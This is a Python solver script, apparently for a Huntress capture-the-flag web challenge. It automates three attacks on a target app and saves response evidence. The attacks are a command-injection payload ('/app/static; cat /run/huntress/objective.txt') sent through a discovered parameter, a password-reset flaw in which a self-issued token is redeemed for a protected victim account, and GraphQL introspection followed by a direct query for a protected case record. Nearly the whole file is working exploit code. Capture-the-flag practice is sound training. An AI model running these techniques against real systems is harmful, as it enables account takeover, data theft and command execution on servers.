#!/usr/bin/env python3
"""Solve Day 25 web targets from their disclosed routes and save evidence."""

from __future__ import annotations

import argparse
import hashlib
from http.cookiejar import CookieJar
import json
from pathlib import Path
import re
import sys
from urllib.error import HTTPError, URLError
from urllib.parse import urlencode, urljoin, urlsplit, urlunsplit
from urllib.request import HTTPCookieProcessor, Request, build_opener

from inspect_target import normalize_url, origin


USER_AGENT = "HuntressCTF-Web-Inspector/1.0"
PROOF_RE = re.compile(r"\bproof_[A-Za-z0-9_-]{12,}\b")
SHELL_PAYLOAD = "/app/static; cat /run/huntress/objective.txt 2>&1 | cat"


class Solver:
    def __init__(self, target: str, output_dir: Path):
        self.target = normalize_url(target)
        self.allowed_origin = origin(self.target)
        self.output_dir = output_dir
        self.output_dir.mkdir(parents=True, exist_ok=True)
        self.records: list[dict[str, object]] = []
        self.opener = build_opener(HTTPCookieProcessor(CookieJar()))
        # Some assigned app variants issue the analyst session at the landing page.
        self.request("/")

    def request(
        self,
        route: str,
        *,
        method: str = "GET",
        query: dict[str, str] | None = None,
        body: bytes | None = None,
    ) -> bytes:
        url = normalize_url(urljoin(self.target, route))
        if origin(url) != self.allowed_origin:
            raise ValueError(f"refusing off-origin route: {route}")
        if query:
            parts = urlsplit(url)
            url = urlunsplit(
                (parts.scheme, parts.netloc, parts.path, urlencode(query), "")
            )
        headers = {"User-Agent": USER_AGENT, "Accept": "*/*"}
        if body is not None:
            headers["Content-Type"] = "application/json"
        request = Request(url, data=body, headers=headers, method=method)
        try:
            response = self.opener.open(request, timeout=15)
        except HTTPError as exc:
            response = exc
        except URLError as exc:
            raise RuntimeError(f"request failed: {exc.reason}") from exc
        data = response.read(2 * 1024 * 1024 + 1)
        if len(data) > 2 * 1024 * 1024:
            raise RuntimeError("response exceeded the 2 MiB evidence limit")
        name = f"{len(self.records) + 1:02d}-{urlsplit(url).path.strip('/').replace('/', '_') or 'root'}.body"
        path = self.output_dir / name
        path.write_bytes(data)
        self.records.append(
            {
                "url": url,
                "method": method,
                "status": getattr(response, "status", response.code),
                "file": name,
                "bytes": len(data),
                "sha256": hashlib.sha256(data).hexdigest(),
            }
        )
        return data

    def json(self, route: str, **kwargs: object) -> dict:
        result = json.loads(self.request(route, **kwargs).decode("utf-8"))
        if not isinstance(result, dict):
            raise ValueError(f"{route} returned a non-object JSON response")
        return result

    def save_report(self, technique: str, proof: str) -> None:
        report = {
            "target": self.target,
            "technique": technique,
            "proof": proof,
            "responses": self.records,
        }
        (self.output_dir / "report.json").write_text(
            json.dumps(report, indent=2, ensure_ascii=False) + "\n",
            encoding="utf-8",
        )


def solve_shell(solver: Solver) -> str:
    clues = solver.json("/api/clues")
    route = clues.get("feature_route")
    parameter = clues.get("input_parameter")
    if not isinstance(route, str) or not isinstance(parameter, str):
        raise ValueError("route inventory lacks its feature route or input parameter")
    result = solver.json(route, query={parameter: SHELL_PAYLOAD})
    output = result.get("stdout")
    if not isinstance(output, str):
        raise RuntimeError(f"worker response did not contain stdout: {result}")
    matches = PROOF_RE.findall(output)
    if not matches:
        raise RuntimeError("worker output contained no proof")
    return matches[-1]


def solve_reset(solver: Solver) -> str:
    clues = solver.json("/api/clues")
    guide_route = clues.get("recovery_guide_route")
    if not isinstance(guide_route, str):
        raise ValueError("route inventory lacks recovery_guide_route")
    guide = solver.json(guide_route)
    accounts = guide.get("accounts")
    if not isinstance(accounts, list):
        raise ValueError("recovery guide lacks account records")
    analyst = next((item for item in accounts if item.get("self_service") is True), None)
    victim = next((item for item in accounts if item.get("self_service") is False), None)
    request_route = guide.get("request_route")
    redeem_route = guide.get("redeem_route")
    account_parameter = guide.get("account_parameter")
    token_parameter = guide.get("token_parameter")
    if not all(
        isinstance(value, str) and value
        for value in (request_route, redeem_route, account_parameter, token_parameter)
    ):
        raise ValueError("recovery guide lacks request, redeem, or parameter names")
    if not isinstance(analyst, dict) or not isinstance(victim, dict):
        raise ValueError("recovery guide does not identify self-service and protected accounts")
    analyst_id = str(analyst["id"])
    victim_id = str(victim["id"])
    issued = solver.json(request_route, query={account_parameter: analyst_id})
    token = issued.get("token")
    if not isinstance(token, str) or not token:
        raise RuntimeError(f"self-service reset did not issue a token: {issued}")
    redeemed = solver.json(
        redeem_route,
        query={account_parameter: victim_id, token_parameter: token},
    )
    proof = redeemed.get("evidence")
    if not isinstance(proof, str) or not PROOF_RE.fullmatch(proof):
        raise RuntimeError(f"cross-account recovery did not return proof evidence: {redeemed}")
    return proof


def solve_resolver(solver: Solver) -> str:
    clues = solver.json("/api/clues")
    route = clues.get("feature_route")
    reference = clues.get("protected_reference")
    if not isinstance(route, str) or reference is None:
        raise ValueError("route inventory lacks feature_route or protected_reference")
    introspection = solver.json(
        route,
        method="POST",
        body=json.dumps(
            {"query": '{ __type(name: "Case") { fields { name } } }'},
            separators=(",", ":"),
        ).encode(),
    )
    fields = introspection.get("data", {}).get("__type", {}).get("fields")
    if not isinstance(fields, list):
        raise RuntimeError(f"GraphQL schema response lacked Case fields: {introspection}")
    names = [field.get("name") for field in fields if isinstance(field, dict)]
    selected = [name for name in ("id", "title", "note") if name in names]
    if "id" not in selected:
        raise RuntimeError(f"Case schema did not expose its id field: {names}")
    selection = " ".join(selected)
    query = f'{{ case(id: "{reference}") {{ {selection} }} }}'
    response = solver.json(
        route,
        method="POST",
        body=json.dumps({"query": query}, separators=(",", ":")).encode(),
    )
    case = response.get("data", {}).get("case")
    if not isinstance(case, dict):
        raise RuntimeError(f"GraphQL case resolver returned no case: {response}")
    for value in case.values():
        if isinstance(value, str):
            matches = PROOF_RE.findall(value)
            if matches:
                return matches[-1]
    raise RuntimeError("protected case fields contained no proof")


def main() -> int:
    parser = argparse.ArgumentParser(description=__doc__)
    parser.add_argument("technique", choices=("shell", "reset", "resolver"))
    parser.add_argument("target", help="exact target URL for the current attempt")
    parser.add_argument("--output-dir", type=Path)
    args = parser.parse_args()
    host = urlsplit(normalize_url(args.target)).hostname or "target"
    output_dir = args.output_dir or Path("web-tools/evidence") / f"{host}-day25"
    solver = Solver(args.target, output_dir)
    try:
        proof = {
            "shell": solve_shell,
            "reset": solve_reset,
            "resolver": solve_resolver,
        }[args.technique](solver)
        solver.save_report(args.technique, proof)
        print(json.dumps({"proof": proof, "report": str(output_dir / "report.json")}))
        return 0
    except (ValueError, RuntimeError, OSError, UnicodeDecodeError, json.JSONDecodeError) as exc:
        print(json.dumps({"error": str(exc), "evidence_dir": str(output_dir)}), file=sys.stderr)
        return 1


if __name__ == "__main__":
    sys.exit(main())
